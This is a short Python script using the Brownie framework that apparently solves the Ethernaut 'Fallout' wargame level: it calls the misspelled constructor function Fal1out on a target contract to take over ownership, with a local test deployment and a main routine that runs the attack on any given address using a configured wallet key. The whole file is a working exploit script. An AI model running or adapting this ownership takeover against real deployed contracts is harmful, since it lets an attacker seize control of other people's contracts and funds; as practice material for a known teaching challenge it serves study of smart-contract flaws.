from brownie import accounts, config, interface, Fallout

def attack(target, hacker):
    fallout = interface.IFallout(target)
    print(f"Owner is hacker: {fallout.owner() == hacker}")
    fallout.Fal1out({'from': hacker})
    print(f"Owner is hacker: {fallout.owner() == hacker}")

def fake():
    owner = accounts[0]
    hacker = accounts[1]
    fallout = Fallout.deploy({'from': owner})
    attack(fallout.address, hacker)
    
def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    attack(target, hacker)